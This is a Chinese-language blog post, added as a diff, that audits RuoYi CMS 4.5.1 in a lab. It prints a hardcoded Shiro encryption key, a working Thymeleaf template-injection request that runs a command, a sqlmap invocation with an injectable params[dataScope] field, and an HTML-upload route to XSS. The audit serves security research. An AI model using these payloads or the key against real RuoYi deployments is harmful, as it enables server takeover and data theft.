@@ -1,0 +1,293 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>若依CMS-4.5.1代码审计 | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前期准备源码 Releases · yangzongzhuan&#x2F;RuoYi 导入sql文件  修改配置文件src&#x2F;main&#x2F;resources&#x2F;application-druid.yml   Shiro反序列化pom.xml中发现引入了Shiro组件  全局搜索cipherKey在src&#x2F;main&#x2F;resources&#x2F;application.yml找到硬编码了密钥信息 1zSyK5Kp6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="若依CMS-4.5.1代码审计">
+<meta property="og:url" content="https://xyaxxya.github.io/posts/7083c6a.html">
+<meta property="og:site_name" content="Yiyi">
+<meta property="og:description" content="前期准备源码 Releases · yangzongzhuan&#x2F;RuoYi 导入sql文件  修改配置文件src&#x2F;main&#x2F;resources&#x2F;application-druid.yml   Shiro反序列化pom.xml中发现引入了Shiro组件  全局搜索cipherKey在src&#x2F;main&#x2F;resources&#x2F;application.yml找到硬编码了密钥信息 1zSyK5Kp6">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dmoe.cc/random.php?4612">
+<meta property="article:published_time" content="2025-06-06T05:53:59.000Z">
+<meta property="article:modified_time" content="2025-06-06T08:01:01.970Z">
+<meta property="article:author" content="yiyi">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="ruoyi">
+<meta property="article:tag" content="CMS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.dmoe.cc/random.php?4612"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/posts/7083c6a.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="JKAzMndNFupeAvLybmTDZQvXJ-qzwexiresLFX-aPSw"/><meta name="msvalidate.01" content="46A43356A247D4026C1F053B84E2275F"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '若依CMS-4.5.1代码审计',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-06-06 16:01:01'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">52</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?4612')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">若依CMS-4.5.1代码审计</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-06T05:53:59.000Z" title="发表于 2025-06-06 13:53:59">2025-06-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-06T08:01:01.970Z" title="更新于 2025-06-06 16:01:01">2025-06-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/7083c6a.html" data-flag-title="若依CMS-4.5.1代码审计"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/7083c6a.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/7083c6a.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>源码</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yangzongzhuan/RuoYi/releases?page=2">Releases · yangzongzhuan&#x2F;RuoYi</a></p>
+<p>导入sql文件</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135444858.png" alt="image-20250606135444858"></p>
+<p>修改配置文件<code>src/main/resources/application-druid.yml</code></p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135824282.png" alt="image-20250606135824282"></p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135646077.png"></p>
+<h1 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h1><p>pom.xml中发现引入了Shiro组件</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606135917196.png" alt="image-20250606135917196"></p>
+<p>全局搜索cipherKey在<code>src/main/resources/application.yml</code>找到硬编码了密钥信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zSyK5Kp6PZAAjlT+eeNMlg==</span><br></pre></td></tr></table></figure>
+
+<p>发现login逻辑中有一个Boolean参数rememberMe</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606140639142.png" alt="image-20250606140639142"></p>
+<p>抓包验证</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606144009115.png" alt="image-20250606144009115"></p>
+<p>查看subject.login跳转到<code>jetbrains://idea/navigate/reference?project=RuoYi-4.5.1&amp;path=~\.m2\repository\org\apache\shiro\shiro-core\1.7.0\shiro-core-1.7.0.jar!\org\apache\shiro\subject\Subject.class</code></p>
+<p>说明已经来到了Shiro对应的Jar包中，用的Shiro进行的鉴权</p>
+<p>在知道Shiro加密密钥和确认Web使用了Shiro进行登录认证鉴权的前提下可以通过漏洞利用工具直接进行利用</p>
+<blockquote>
+<p>Apache Shiro &lt;&#x3D;1.2.4版本属于密钥硬编码且使用AES-CBC加密模式，在Apache Shiro 1.2.4版本之后则是由用户指定密钥且加密模式更改为了AES-GCM</p>
+</blockquote>
+<p>查看版本</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606141602830.png" alt="image-20250606141602830"></p>
+<p>工具直接打即可</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606143040099.png" alt="image-20250606143040099"></p>
+<h1 id="Thymeleaf模版注入"><a href="#Thymeleaf模版注入" class="headerlink" title="Thymeleaf模版注入"></a>Thymeleaf模版注入</h1><p>发现thymeleaf组件 版本为2.0.0</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606143128503.png" alt="image-20250606143128503"></p>
+<p>先全局搜一下<code>::</code>查看哪些组件可控</p>
+<blockquote>
+<p>src&#x2F;main&#x2F;java&#x2F;com&#x2F;ruoyi&#x2F;web&#x2F;controller&#x2F;demo&#x2F;controller&#x2F;DemoFormController.java</p>
+</blockquote>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606143557031.png" alt="image-20250606143557031"></p>
+<p>接受两个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* @param    fragment   页面中的模板名称</span><br><span class="line">* @param    taskName   任务名称</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<blockquote>
+<p>攻击参考</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/bfengj/CTF/blob/main/Web/java/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf/README.md">CTF&#x2F;Web&#x2F;java&#x2F;模板注入&#x2F;Thymeleaf&#x2F;README.md at main · bfengj&#x2F;CTF</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /demo/form/localrefresh/task HTTP/1.1</span><br><span class="line">Host: 10.61.197.210</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: JSESSIONID=5b02998a-cf66-4ed5-a4bb-bbf66bfb8f28</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">taskName=1&amp;fragment=__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606144504522.png" alt="image-20250606144504522"></p>
+<h1 id="SQLInjection安全问题"><a href="#SQLInjection安全问题" class="headerlink" title="SQLInjection安全问题"></a>SQLInjection安全问题</h1><blockquote>
+<p>RuoYI CMS使用了Mybatis持久层框架，而在MyBatis中会使用XML或注解来配置和映射原生信息将接口和Java的POJOs(Plain Ordinary Java Object，普通的Java对象)映射成数据库中的记录，所以我们可以通过全局检索”${}”来确定未使用预编译的可疑位置，随后进行参数回溯分析来确定漏洞是否真实存在</p>
+</blockquote>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606150726784.png" alt="image-20250606150726784"></p>
+<p>根据对应的mapper接口<code>&lt;mapper namespace=&quot;com.ruoyi.system.mapper.SysDeptMapper&quot;&gt;</code></p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151212635.png" alt="image-20250606151212635"></p>
+<p>检索接口的具体调用点有那些位置</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151310161.png" alt="image-20250606151310161"></p>
+<p>向上回溯Controller层</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151449507.png" alt="image-20250606151449507"></p>
+<blockquote>
+<p>@RequiresPermissions注解表明接口访问权限</p>
+<p>@ResponseBody注解表明会将返回值写入http响应</p>
+</blockquote>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151521836.png" alt="image-20250606151521836"></p>
+<p>还需要看一下上层在调用接口的时候是否有做过滤处理</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151746230.png" alt="image-20250606151746230"></p>
+<p>发现没有 那么就可以确定&#x2F;system&#x2F;dept&#x2F;list存在sql注入</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606151929184.png" alt="image-20250606151929184"></p>
+<p>正常请求没有参数，可以手动构造<code>params[dataScope]</code>丢给sqlmap跑一下</p>
+<blockquote>
+<p>在 Java 后端中，这样的参数会自动映射为一个嵌套的 Map：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestParam</span> Map&lt;String, Object&gt; params;</span><br><span class="line"><span class="comment">// params.get(&quot;dataScope&quot;) -&gt; 值为 &quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者，如果是实体类中写了 <code>Map&lt;String, Object&gt; params</code> 字段，也会映射进去。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deptName=</span><br><span class="line">status=0</span><br><span class="line">params[dataScope]=</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\<span class="number">31702</span>\Desktop\req.txt --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606152747975.png" alt="image-20250606152747975"></p>
+<p>其余的漏洞点同理，这里再给一处</p>
+<p>从SysUserMapper出发</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153348584.png" alt="image-20250606153348584"></p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153342319.png" alt="image-20250606153342319"></p>
+<p>回溯Controller层</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153453298.png" alt="image-20250606153453298"></p>
+<p>抓个包</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606153727664.png" alt="image-20250606153727664"></p>
+<p>手动添加params[dataScope]</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageSize=<span class="number">10</span>&amp;pageNum=<span class="number">1</span>&amp;orderByColumn=createTime&amp;isAsc=desc&amp;deptId=<span class="number">100</span>&amp;parentId=&amp;loginName=&amp;phonenumber=&amp;status=&amp;params<span class="variable">%5BbeginTime%</span><span class="number">5</span>D=&amp;params<span class="variable">%5BendTime%</span><span class="number">5</span>D=&amp;params[dataScope]=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154125820.png" alt="image-20250606154125820"></p>
+<h1 id="文件上传导致XSS"><a href="#文件上传导致XSS" class="headerlink" title="文件上传导致XSS"></a>文件上传导致XSS</h1><p>文件上传位置</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154240737.png" alt="image-20250606154240737"></p>
+<p>全局搜FileUpload定位到上传位置</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154332609.png" alt="image-20250606154332609"></p>
+<p>跟进</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154406790.png" alt="image-20250606154406790"></p>
+<p>紧接着在这里调用重载的upload方法来进行文件上传操作</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154524613.png" alt="image-20250606154524613"></p>
+<p>然后就是文件后缀和长度的检测</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154758566.png" alt="image-20250606154758566"></p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606154554612.png" alt="image-20250606154554612"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">assertAllowed</span><span class="params">(MultipartFile file, String[] allowedExtension)</span></span><br><span class="line">        <span class="keyword">throws</span> FileSizeLimitExceededException, InvalidExtensionException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">size</span> <span class="operator">=</span> file.getSize();</span><br><span class="line">    <span class="keyword">if</span> (DEFAULT_MAX_SIZE != -<span class="number">1</span> &amp;&amp; size &gt; DEFAULT_MAX_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileSizeLimitExceededException</span>(DEFAULT_MAX_SIZE / <span class="number">1024</span> / <span class="number">1024</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">    <span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> getExtension(file);</span><br><span class="line">    <span class="keyword">if</span> (allowedExtension != <span class="literal">null</span> &amp;&amp; !isAllowedExtension(extension, allowedExtension))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (allowedExtension == MimeTypeUtils.IMAGE_EXTENSION)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidExtensionException</span>.InvalidImageExtensionException(allowedExtension, extension,</span><br><span class="line">                    fileName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (allowedExtension == MimeTypeUtils.FLASH_EXTENSION)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidExtensionException</span>.InvalidFlashExtensionException(allowedExtension, extension,</span><br><span class="line">                    fileName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (allowedExtension == MimeTypeUtils.MEDIA_EXTENSION)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidExtensionException</span>.InvalidMediaExtensionException(allowedExtension, extension,</span><br><span class="line">                    fileName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (allowedExtension == MimeTypeUtils.VIDEO_EXTENSION)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidExtensionException</span>.InvalidVideoExtensionException(allowedExtension, extension,</span><br><span class="line">                    fileName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidExtensionException</span>(allowedExtension, extension, fileName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>包含了html文件和pdf文件可以用于进行上传对应类型的文件，如果支持在线解析则可以导致XSS</p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606155507590.png" alt="image-20250606155507590"></p>
+<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250606155519885.png" alt="image-20250606155519885"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/posts/7083c6a.html">https://xyaxxya.github.io/posts/7083c6a.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/ruoyi/">ruoyi</a><a class="post-meta__tags" href="/tags/CMS/">CMS</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?4612" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/c0aca0e.html" title="春秋云镜-Privilege"><img class="cover" src="https://www.dmoe.cc/random.php?1969" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">春秋云镜-Privilege</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">春风得意马蹄疾，一日看尽长安花</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">52</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab fa-github"></i><span>关注捏</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2023/09/23/about-me/" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">慢慢来，比较快</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">前期准备</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">Shiro反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" 